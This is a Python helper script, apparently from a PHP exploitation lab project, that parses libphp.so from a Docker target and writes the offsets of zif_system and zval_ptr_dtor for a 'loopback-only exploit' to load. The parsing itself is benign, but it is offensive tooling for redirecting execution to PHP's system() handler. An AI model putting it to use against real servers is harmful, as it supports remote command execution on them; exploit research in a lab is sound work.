#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Read zif_system / zval_ptr_dtor offsets from an Apache libphp.so.

Sources (pick one):
  * running container  -- docker cp the libphp.so out and parse it
  * local file         -- parse a libphp.so you already have on disk

Writes offsets.env for the loopback-only exploit to load automatically.

Usage:
    python3 docker/offsets.py [container] [output]
    python3 docker/offsets.py --container NAME [--lib-in-container PATH] \
                              [--output PATH]
    python3 docker/offsets.py --libphp /path/to/libphp.so [--output PATH]
"""

# Imports
from __future__ import annotations

import argparse
import os
import shutil
import struct
import subprocess
import sys
import tempfile

LIB = "/usr/lib/apache2/modules/libphp.so"
HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CONTAINER = "php2shell-target"
DEFAULT_OUTPUT = os.path.join(os.path.dirname(HERE), "out", "offsets.env")

SHT_SYMTAB = 2
SHT_DYNSYM = 11
PT_LOAD = 1


def copy_lib(container, lib_in_container):
    fd, path = tempfile.mkstemp(prefix="libphp-", suffix=".so")
    os.close(fd)
    try:
        subprocess.run(
            ["docker", "cp", f"{container}:{lib_in_container}", path],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
        )
    except FileNotFoundError:
        raise SystemExit("docker not found in PATH")
    except subprocess.CalledProcessError as e:
        os.unlink(path)
        raise SystemExit(
            f"cannot copy {lib_in_container} from container {container!r}: "
            f"{e.stderr.decode(errors='replace').strip()}"
        )
    return path, True  # (path, is_temp)


def stage_local_lib(libphp_path):
    """Copy a local libphp.so into a temp file so the caller's cleanup
    path is uniform; the local file itself is never modified."""
    if not os.path.isfile(libphp_path):
        raise SystemExit(f"libphp.so not found: {libphp_path!r}")
    fd, path = tempfile.mkstemp(prefix="libphp-", suffix=".so")
    os.close(fd)
    try:
        shutil.copyfile(libphp_path, path)
    except OSError as e:
        os.unlink(path)
        raise SystemExit(f"cannot read {libphp_path!r}: {e}")
    return path, True


def parse_elf(path):
    with open(path, "rb") as f:
        data = f.read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise SystemExit("libphp.so is not a little-endian ELF64 file")

    e_phoff, = struct.unpack_from("<Q", data, 0x20)
    e_shoff, = struct.unpack_from("<Q", data, 0x28)
    e_phentsize, e_phnum = struct.unpack_from("<HH", data, 0x36)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)

    loads = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, = struct.unpack_from("<I", data, off)
        p_vaddr, = struct.unpack_from("<Q", data, off + 16)
        p_memsz, = struct.unpack_from("<Q", data, off + 40)
        if p_type == PT_LOAD and p_memsz:
            loads.append(p_vaddr)
    if not loads:
        raise SystemExit("no PT_LOAD segment")
    bias = min(loads)

    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type = struct.unpack_from("<II", data, off)
        sh_offset, sh_size = struct.unpack_from("<QQ", data, off + 24)
        sh_link, = struct.unpack_from("<I", data, off + 40)
        sh_entsize, = struct.unpack_from("<Q", data, off + 56)
        sections.append({
            "name_off": sh_name, "type": sh_type, "offset": sh_offset,
            "size": sh_size, "link": sh_link, "entsize": sh_entsize,
        })

    wanted = {"zif_system": None, "zval_ptr_dtor": None}
    for sec in sections:
        if sec["type"] not in (SHT_SYMTAB, SHT_DYNSYM):
            continue
        strtab = sections[sec["link"]] if sec["link"] < len(sections) else None
        if strtab is None:
            continue
        entsize = sec["entsize"] or 24
        count = sec["size"] // entsize
        for i in range(count):
            off = sec["offset"] + i * entsize
            st_name, = struct.unpack_from("<I", data, off)
            st_value, = struct.unpack_from("<Q", data, off + 8)
            if st_name == 0:
                continue
            name_off = strtab["offset"] + st_name
            end = data.find(b"\x00", name_off)
            if end < 0:
                continue
            name = data[name_off:end].decode("ascii", "replace")
            if name in wanted and wanted[name] is None:
                wanted[name] = st_value

    missing = [name for name, val in wanted.items() if val is None]
    if missing:
        raise SystemExit("symbols not found in libphp.so: " + ", ".join(missing))
    return bias, {k: v for k, v in wanted.items() if v is not None}


def main():
    # Backwards-compat: `python3 offsets.py [container] [output]`.
    # If the first positional argument starts with `-`, parse as flags
    # instead; otherwise treat as (container, output) like before.
    legacy = (len(sys.argv) > 1
              and not sys.argv[1].startswith("-"))
    ap = argparse.ArgumentParser(
        description="Extract zif_system / zval_ptr_dtor from libphp.so",
    )
    ap.add_argument("--container", default=None,
                    help=f"docker container name (default: {DEFAULT_CONTAINER})")
    ap.add_argument("--lib-in-container", default=LIB,
                    help=f"libphp.so path inside the container (default: {LIB})")
    ap.add_argument("--libphp", default=None,
                    help="skip docker; read a local libphp.so directly")
    ap.add_argument("--output", default=None,
                    help=f"env file to write (default: {DEFAULT_OUTPUT})")

    if legacy:
        container = sys.argv[1]
        output = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_OUTPUT
        libphp = None
        lib_in_container = LIB
    else:
        args = ap.parse_args()
        if args.libphp and args.container:
            raise SystemExit("--libphp and --container are mutually exclusive")
        libphp = args.libphp
        container = args.container if not libphp else None
        if not libphp and not container:
            container = DEFAULT_CONTAINER
        output = args.output or DEFAULT_OUTPUT
        lib_in_container = args.lib_in_container

    if libphp:
        path, is_temp = stage_local_lib(libphp)
    else:
        path, is_temp = copy_lib(container, lib_in_container)
    try:
        bias, syms = parse_elf(path)
    finally:
        if is_temp:
            try:
                os.unlink(path)
            except OSError:
                pass

    zif = syms["zif_system"] - bias
    dtor = syms["zval_ptr_dtor"] - bias

    os.makedirs(os.path.dirname(output), exist_ok=True)
    with open(output, "w", encoding="utf-8") as f:
        f.write(f"ZIF_OFFSET=0x{zif:x}\n")
        f.write(f"DTOR_OFFSET=0x{dtor:x}\n")

    source = f"libphp={libphp}" if libphp else f"container={container}"
    print(f"zif_system     0x{zif:x}")
    print(f"zval_ptr_dtor  0x{dtor:x}")
    print(f"source         {source}")
    print(f"wrote          {output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
